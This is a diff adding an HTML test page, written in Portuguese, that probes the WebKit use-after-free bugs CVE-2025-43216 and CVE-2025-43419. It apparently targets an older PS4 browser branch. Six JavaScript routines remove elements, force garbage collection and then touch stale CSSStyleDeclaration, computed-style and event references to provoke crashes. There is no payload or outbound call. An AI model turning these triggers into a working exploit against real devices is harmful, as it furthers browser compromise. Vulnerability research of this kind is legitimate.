@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2025-43216/43419 — @ulexec UAF WebCore</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff6644;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#080400;border:2px solid #664422;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#cc8866;line-height:1.8}
+.src strong{color:#ff9966;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #1a1008;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#66aaff}.sep{color:#333}
+.btn{display:inline-block;margin-top:10px;margin-right:5px;padding:7px 13px;background:#0d0600;border:1px solid #442200;border-radius:4px;color:#cc6644;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#ff6644;color:#ff8866}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🐛 CVE-2025-43216/43419 — @ulexec (Ignacio Sanmillan) UAF WebCore</h1>
+<p class="meta">Crédito: Ignacio Sanmillan @ulexec · Bugzilla #295382 (CVE-2025-43216) · #293895 (CVE-2025-43419)</p>
+<div class="src">
+<strong>📋 ANÁLISE — Ignacio Sanmillan (@ulexec)</strong>
+CVE-2025-43216: Bugzilla #295382 · Safari crash · "use-after-free" UAF confirmado<br>
+CVE-2025-43419: Bugzilla #293895 · Memory corruption · "improved memory handling"<br>
+<br>
+PERFIL @ULEXEC: Especialista em memory corruption em browser engines.<br>
+Foco histórico: DOM event handling · CSSStyleDeclaration · computed style callbacks<br>
+computed style durante layout → UAF em style objects · event handler durante destroy<br>
+<br>
+PADRÃO IDENTIFICADO: Acesso a CSSStyleDeclaration de elemento removido durante<br>
+getComputedStyle() · style.getPropertyValue() em elemento sendo destroyed<br>
+DOM event dispatch para elementos em transição de estado (being removed)<br>
+<br>
+CVE-2025-43419: Afeta antes de 2.50.0 · CVE-2025-43216: antes de 2.50.2<br>
+PS4 branch Set/2023 = 24-26 meses anterior a ambos os fixes
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① CSSStyleDeclaration UAF</button>
+  <button class="btn" onclick="t2()">② getComputedStyle + Remove</button>
+  <button class="btn" onclick="t3()">③ Style Property Access Chain</button>
+  <button class="btn" onclick="t4()">④ Event During Destroy</button>
+  <button class="btn" onclick="t5()">⑤ CSS Custom Properties UAF</button>
+  <button class="btn" onclick="t6()">⑥ Cascade + Remove Chain</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<15;i++)a.push(new ArrayBuffer(1024*1024*2));a=null}catch(e){}}
+
+function t1(){
+  sep('CSSStyleDeclaration UAF — @ulexec Pattern');
+  l('Guardando referência ao style de elemento antes de remover...','w');
+  try {
+    var staleRefs=[];
+    for(var i=0;i<50;i++){
+      var el=document.createElement('div');
+      el.style.cssText='color:red;font-size:'+i+'px;margin:'+i+'px;padding:'+i+'px;border:1px solid blue;background:rgba('+i+',0,0,0.5)';
+      document.body.appendChild(el);
+      // Guarda referência ao CSSStyleDeclaration ANTES de remover
+      var styleRef=el.style;
+      document.body.removeChild(el); // remove do DOM
+      staleRefs.push({style:styleRef, el:el});
+    }
+    gc(); // GC com refs salvas
+    // Tenta acessar propriedades CSS via referência stale
+    var ok=0, crash=0;
+    staleRefs.forEach(function(ref){
+      try {
+        var color=ref.style.color;
+        var fs=ref.style.fontSize;
+        ref.style.color='blue'; // tenta MODIFICAR stale style
+        var margin=ref.style.margin;
+        ok++;
+      } catch(e2){ crash++; l('CRASH em stale CSSStyleDeclaration: '+e2.name,'e'); }
+    });
+    l('Stale CSSStyleDeclaration: ok='+ok+' crash='+crash, crash>0?'e':'ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t2(){
+  sep('getComputedStyle + Remove Simultâneo');
+  l('getComputedStyle em elemento sendo removido do DOM...','w');
+  try {
+    var refs=[];
+    for(var i=0;i<40;i++){
+      var el=document.createElement('div');
+      el.style.cssText='width:'+i+'px;height:'+i+'px;display:block;color:hsl('+i*9+',70%,50%)';
+      document.body.appendChild(el);
+      // getComputedStyle ANTES de remover (válido)
+      var computed=window.getComputedStyle(el);
+      // Remove o elemento
+      document.body.removeChild(el);
+      // Agora tenta usar o computed style de elemento removido
+      refs.push(computed);
+    }
+    gc();
+    // Acessa computed style de elementos já removidos + pós-GC
+    var ok=0, errors=0;
+    refs.forEach(function(cs){
+      try {
+        var color=cs.color;
+        var width=cs.width;
+        var display=cs.display;
+        ok++;
+      } catch(e2){ errors++; l('CRASH getComputedStyle stale: '+e2.name,'e'); }
+    });
+    l('getComputedStyle stale: ok='+ok+' errors='+errors, errors>0?'e':'ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('Style Property Chain Access');
+  l('CSSStyleDeclaration.item() e getPropertyValue() encadeados...','w');
+  try {
+    // Cria elemento com muitas propriedades CSS
+    var el=document.createElement('div');
+    el.setAttribute('style','color:red;background-color:#fff;font-size:12px;font-weight:bold;margin:10px;padding:10px;border:1px solid black;display:block;position:relative;top:0;left:0;width:100px;height:50px;overflow:hidden;opacity:1;visibility:visible;cursor:pointer;z-index:1');
+    document.body.appendChild(el);
+    var styleDecl=el.style;
+    var computed=window.getComputedStyle(el);
+    // Remove o elemento
+    document.body.removeChild(el);
+    gc();
+    // Itera sobre propriedades da stale declaration
+    var propsRead=0;
+    for(var idx=0;idx<styleDecl.length;idx++){
+      try {
+        var prop=styleDecl.item(idx);
+        var val=styleDecl.getPropertyValue(prop);
+        var priority=styleDecl.getPropertyPriority(prop);
+        propsRead++;
+      } catch(e2){ l('CRASH em item('+idx+'): '+e2.name,'e'); }
+    }
+    l('Style property chain: '+propsRead+' propriedades lidas pós-remoção','ok');
+    // Também acessa via computed
+    var computedProps=['color','fontSize','display','position'];
+    computedProps.forEach(function(p){
+      try { var v=computed.getPropertyValue(p); } catch(e2){ l('CRASH computed.'+p+': '+e2.name,'e'); }
+    });
+    l('Computed style stale: sem crash','ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('Event Dispatch Durante Destroy');
+  l('@ulexec pattern: dispatchEvent para elemento em processo de remoção...','w');
+  try {
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    var customEvents=[];
+    var evCount=0;
+    for(var i=0;i<20;i++){
+      var el=document.createElement('div');
+      el.setAttribute('data-idx',i);
+      el.addEventListener('custom-uaf-event',function(e){
+        evCount++;
+        var target=e.currentTarget;
+        // Remove o elemento DURANTE o handler do evento
+        if(target&&target.parentNode) target.parentNode.removeChild(target);
+        gc();
+        // Tenta acessar o style depois de remover
+        try { var color=target.style.color; } catch(e2){}
+      });
+      host.appendChild(el);
+      customEvents.push({el:el, ev:new CustomEvent('custom-uaf-event',{bubbles:false})});
+    }
+    // Dispara todos os eventos
+    customEvents.forEach(function(c){
+      try { c.el.dispatchEvent(c.ev); } catch(e2){}
+    });
+    if(host.parentNode) document.body.removeChild(host);
+    l('Event during destroy: '+evCount+' handlers sem crash','ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t5(){
+  sep('CSS Custom Properties (--var) UAF');
+  l('Custom properties em elemento removido e acessadas via stale ref...','w');
+  try {
+    var rootStyle=document.createElement('style');
+    rootStyle.textContent=':root{--color-a:red;--size-b:12px;--margin-c:8px}';
+    document.head.appendChild(rootStyle);
+    var stale=[];
+    for(var i=0;i<30;i++){
+      var el=document.createElement('div');
+      el.style.setProperty('--local-var-'+i, 'value'+i);
+      el.style.color='var(--color-a)';
+      document.body.appendChild(el);
+      var cs=window.getComputedStyle(el);
+      stale.push({el:el, cs:cs, inlineStyle:el.style});
+      document.body.removeChild(el);
+    }
+    gc();
+    // Acessa custom properties via computed + inline style stale
+    stale.forEach(function(s,idx){
+      try {
+        var v1=s.cs.getPropertyValue('--color-a');
+        var v2=s.inlineStyle.getPropertyValue('--local-var-'+idx);
+        s.inlineStyle.setProperty('--local-var-'+idx,'newvalue');
+      } catch(e2){ l('CRASH custom prop idx='+idx+': '+e2.name,'e'); }
+    });
+    document.head.removeChild(rootStyle);
+    l('CSS custom properties UAF: sem crash','ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('CSS Cascade + Remove Chain');
+  l('Múltiplas stylesheets com cascade e elementos removidos em cascade...','w');
+  try {
+    var sheets=[];
+    for(var i=0;i<5;i++){
+      var s=document.createElement('style');
+      s.textContent='.cascade-'+i+'{color:hsl('+i*72+',80%,50%);font-weight:'+((i%2)?'bold':'normal')+';}'+
+        '.cascade-'+i+' > *{opacity:'+(0.5+i*0.1)+'}';
+      document.head.appendChild(s);
+      sheets.push(s);
+    }
+    var elements=[];
+    for(var j=0;j<50;j++){
+      var el=document.createElement('div');
+      el.className='cascade-'+(j%5);
+      var child=document.createElement('span');
+      child.textContent='child'+j;
+      el.appendChild(child);
+      document.body.appendChild(el);
+      elements.push(el);
+    }
+    document.body.offsetHeight; // força style cascade
+    // Remove stylesheets uma a uma e força recalc entre cada
+    sheets.forEach(function(s){
+      document.head.removeChild(s);
+      document.body.offsetHeight;
+    });
+    // Remove elementos e acessa computed style deles
+    elements.forEach(function(el,idx){
+      var cs=window.getComputedStyle(el);
+      if(el.parentNode) document.body.removeChild(el);
+      try { var c=cs.color; } catch(e2){}
+    });
+    l('CSS cascade chain: sem crash','ok');
+  } catch(e){ l('CRASH cascade: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2025-43216/43419 — @ulexec UAF WebCore','w');
+  l('Testando: CSSStyleDeclaration · getComputedStyle · event dispatch · custom props','i');
+  t1();
+  setTimeout(t2,500);setTimeout(t3,1000);setTimeout(t4,1500);
+  setTimeout(t5,2000);setTimeout(t6,2500);
+}
+</script>
+</body>
+</html>
